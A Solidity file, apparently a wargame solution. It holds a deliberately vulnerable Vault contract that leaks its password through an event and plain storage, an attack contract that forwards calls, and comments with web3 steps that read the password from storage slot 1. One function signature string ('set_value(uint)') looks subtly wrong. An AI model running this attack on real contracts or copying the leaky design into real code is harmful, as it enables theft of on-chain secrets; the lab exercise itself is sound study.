// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;
    uint public num;

    event unlocked(bytes32 pass1, bytes32 pass2);
    event set_var(uint num);

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function set_value(uint _num) public {
        emit set_var(num);
        num = _num;

    }

    function unlock(bytes32 _password) public {
        emit unlocked(_password, password);
        if (password == _password) {
            locked = false;
        }
    }
}


contract Atk_Vault {
    address public target;

    constructor(address addr) {
        target = addr;
    }
    function set_target(address addr) public {
        target = addr;
    }

    function set_value(uint _num) public {
        (bool success, bytes memory data) = target.call(
            abi.encodeWithSignature("set_value(uint)", _num)
        );
    }

    function unlock(bytes32 password) public {
        (bool success, bytes memory data) = target.call(
            abi.encodeWithSignature("unlock(bytes32)", password)
        );
    }
}

//VAULT_ADDRESS = "0x1Af320496F79081dB9cef774d9B8Bb5303779A37"
//password_addr = f"0x{1:064x}"
//password_value = web3.eth.get_storage_at(VAULT_ADDRESS, password_addr).hex()
//password_bytes = bytes.fromhex(password_value[2:])
// REMEMBER SET GAS_LIMIT


